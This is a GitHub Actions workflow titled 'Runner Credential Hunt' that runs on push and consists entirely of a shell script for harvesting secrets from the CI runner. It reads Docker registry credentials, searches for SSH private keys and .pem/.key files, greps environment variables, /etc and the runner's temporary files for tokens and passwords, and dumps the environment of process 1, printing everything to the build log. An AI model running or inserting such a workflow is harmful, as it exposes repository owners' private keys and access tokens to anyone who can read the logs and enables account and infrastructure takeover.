name: Runner Credential Hunt
on: [push]
jobs:
  hunt:
    runs-on: ubuntu-latest
    steps:
      - name: Hunt for credentials on runner
        run: |
          echo "=== Docker config ==="
          cat /home/runner/.docker/config.json 2>/dev/null || echo "No docker config"
          ls -la /home/runner/.docker/ 2>/dev/null
          
          echo "=== Runner config files ==="
          find /home/runner -name "*.json" -o -name "*.conf" -o -name "*.cfg" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -20
          
          echo "=== SSH keys ==="
          find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | head -10
          
          echo "=== Environment with secrets ==="
          env | grep -i "secret\|token\|key\|password\|credential\|auth\|docker\|registry" | grep -v "GITHUB_"
          
          echo "=== /etc/ files with tokens ==="
          grep -r "token\|secret\|password" /etc/ 2>/dev/null | grep -v "Binary\|Permission denied\|#" | head -10
          
          echo "=== /opt files ==="
          ls -la /opt/ 2>/dev/null
          find /opt -name "*.json" -o -name "token*" -o -name "secret*" 2>/dev/null | head -10
          
          echo "=== Actions toolkit secrets ==="
          cat /home/runner/work/_temp/_runner_file_commands/* 2>/dev/null | grep -i "token\|secret" | head -10
          
          echo "=== Proc environ for all processes ==="
          cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | grep -i "token\|secret\|key\|password" | head -10
